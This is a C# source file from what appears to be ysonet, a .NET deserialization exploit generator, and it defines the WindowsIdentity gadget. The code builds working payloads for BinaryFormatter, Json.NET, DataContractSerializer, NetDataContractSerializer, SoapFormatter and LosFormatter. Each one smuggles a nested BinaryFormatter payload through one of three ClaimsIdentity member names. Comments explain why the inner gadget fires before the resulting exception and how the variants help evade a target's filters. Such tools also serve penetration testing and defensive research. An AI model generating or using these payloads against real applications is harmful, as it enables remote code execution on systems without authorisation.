using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Security.Principal;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class WindowsIdentityGenerator : GenericGenerator
    {
        // Discovery facets (category search only): carries a BinaryFormatter payload
        // in WindowsIdentity (mscorlib, built-in).
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // claims-based serialization is 4.5+; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        // Bridge from BinaryFormatter constructor/callback to BinaryFormatter
        // Usefule for Json.NET since it invokes ISerializable callbacks during deserialization

        // WindowsIdentity extends ClaimsIdentity
        // https://referencesource.microsoft.com/#mscorlib/system/security/claims/ClaimsIdentity.cs,60342e51e4acc828,references
        //
        // WHY WindowsIdentity AND NOT ClaimsIdentity ITSELF: ClaimsIdentity is [Serializable]
        // but NOT ISerializable, and its private Deserialize(SerializationInfo, ...) is called
        // only from the two protected SerializationInfo constructors. Naming ClaimsIdentity in
        // a payload therefore lands on the field/[OnDeserialized] route instead (that is the
        // separate ClaimsIdentity gadget). Reaching the KEY route needs a derived type that
        // implements ISerializable and chains the protected base constructor. WindowsIdentity
        // is the only such subclass in mscorlib.
        //
        // THE SINK, and why there are three variants. ClaimsIdentity.Deserialize walks the
        // SerializationInfo and switches on the entry NAME. Three of those names reach an
        // unbindered BinaryFormatter, and the variant picks which one this payload writes:
        //
        //   System.Security.ClaimsIdentity.actor
        //       m_actor = (ClaimsIdentity)bf.Deserialize(ms, null, false);
        //   System.Security.ClaimsIdentity.bootstrapContext
        //       m_bootstrapContext = bf.Deserialize(ms, null, false);
        //   System.Security.ClaimsIdentity.claims
        //       DeserializeClaims(...) -> m_instanceClaims = (List<Claim>)new BinaryFormatter()
        //                                     .Deserialize(ms, null, false);
        //
        // Every branch base64-decodes the string and runs the inner formatter with no binder,
        // and the cast to ClaimsIdentity / List<Claim> happens AFTER that call returns, so the
        // inner gadget has already fired when the InvalidCastException is thrown.
        //
        // The other keys Deserialize accepts (.version, .authenticationType, .nameClaimType,
        // .roleClaimType, .label) are plain info.GetString reads and carry no payload, which is
        // why they are not variants.
        //
        // WindowsIdentity(SerializationInfo, StreamingContext) chains : this(info), and the
        // private WindowsIdentity(SerializationInfo) chains : base(info) - the SINGLE argument
        // base constructor - so useContext is false and all three keys run a context-free
        // new BinaryFormatter(). That constructor reads its own required "m_userToken" member
        // only AFTER the base constructor returns, which is why the marshal below does not have
        // to supply it: the payload has already fired by the time the missing key throws.
        //
        // Originally this gadget was fixed on ".actor" (Soroush Dalili: "actor has the same
        // effect as bootstrapContext but is shorter"). It is now the DEFAULT rather than the
        // only option, so an operator whose target filters or schema rejects one member name
        // can pick another, and so the gadget is a complete map of its own sink. Variant 1 is
        // byte-identical to what this gadget always emitted.

        private int variant_number = 1; // Default

        public override string AdditionalInfo()
        {
            return "The variant picks which ClaimsIdentity key carries the inner BinaryFormatter payload.";
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                // Kept free of long unbroken tokens on purpose: the help wrapper hyphenates a
                // word that does not fit, which would make a member name uncopyable.
                {"var|variant=", "Which SerializationInfo key carries the inner BinaryFormatter payload. " +
                    "All three names start with 'System.Security.ClaimsIdentity.' and end with: " +
                    "1 = actor (default, the shortest), 2 = bootstrapContext, 3 = claims. " +
                    "All three reach the same unbindered BinaryFormatter in ClaimsIdentity.Deserialize " +
                    "and have the same effect; they differ only in the member NAME on the wire. " +
                    "An unknown number falls back to 1.",
                    v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        // Every variant carries the same payload through the same sink on the same type, so
        // none of them narrows the formatter list and none of them overrides a facet.
        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "actor member (default)"),
                new GadgetVariant(2, "bootstrapContext member"),
                new GadgetVariant(3, "claims member")
            };
        }

        // The three member names this gadget can write, in one place, spelled out. Every
        // formatter branch below reads the name from here, so the marshal and the four
        // hand written documents can never drift apart. An unknown variant number falls
        // through to the default rather than throwing, matching WindowsClaimsIdentity.
        private string SerializationInfoKeyForVariant()
        {
            if (variant_number == 2) return "System.Security.ClaimsIdentity.bootstrapContext";
            if (variant_number == 3) return "System.Security.ClaimsIdentity.claims";
            return "System.Security.ClaimsIdentity.actor";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter (3)", "Json.NET (3)", "DataContractSerializer (3)", "NetDataContractSerializer (3)", "SoapFormatter (3)", "LosFormatter (3)" };
        }

        public override string Finders()
        {
            return "Levi Broderick";
        }

        public override string Contributors()
        {
            return "Alvaro Munoz, Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateInner("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
            string claimsIdentityKey = SerializationInfoKeyForVariant();

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                var obj = new WindowsIdentityIdentityMarshal(claimsIdentityKey, b64encoded);
                return Serialize(obj, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("json.net"))
            {
                string payload = @"{
                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    '" + claimsIdentityKey + @"': '" + b64encoded + @"'
                }";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonMinifier.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = JsonMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                string payload = $@"<root type=""System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <WindowsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"">
      <{claimsIdentityKey} i:type=""x:string"" xmlns="""">{b64encoded}</{claimsIdentityKey}>
       </WindowsIdentity>
</root>
";
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = XmlMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {
                string payload = $@"<root>
<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""System.Security.Principal.WindowsIdentity"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <{claimsIdentityKey} z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</{claimsIdentityKey}>
</w>
</root>
";
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = XmlMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        // The document above is wrapped in a <root> envelope, so the serializer
                        // has to be pointed at the child element. Without the root name the
                        // helper hands <root> straight to NetDataContractSerializer, which
                        // rejects it before the payload is reached, and -t silently proves
                        // nothing (WindowsClaimsIdentity already passes "root" for the same
                        // reason).
                        SerializersHelper.NetDataContractSerializer_deserialize(payload, "root");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {
                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
    <a1:WindowsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Security.Principal/mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
      <{claimsIdentityKey} xsi:type=""xsd:string"" xmlns="""">{b64encoded}</{claimsIdentityKey}>
    </a1:WindowsIdentity>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null, FormatterType.SoapFormatter);
                    }
                    else
                    {
                        payload = XmlMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

    // One marshal for all three variants: the emitted object is the same WindowsIdentity
    // carrying the same single string, and only the member NAME changes, so the key comes in
    // as an argument instead of three near-identical classes. Nothing else has to be written:
    // ClaimsIdentity.Deserialize ignores names it does not know, and WindowsIdentity's own
    // required "m_userToken" is read only after the base constructor (and therefore the inner
    // BinaryFormatter) has already run.
    [Serializable]
    public class WindowsIdentityIdentityMarshal : ISerializable
    {
        public WindowsIdentityIdentityMarshal(string claimsIdentityKey, string b64payload)
        {
            ClaimsIdentityKey = claimsIdentityKey;
            B64Payload = b64payload;
        }

        private string ClaimsIdentityKey { get; }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsIdentity));
            info.AddValue(ClaimsIdentityKey, B64Payload);
        }
    }
}
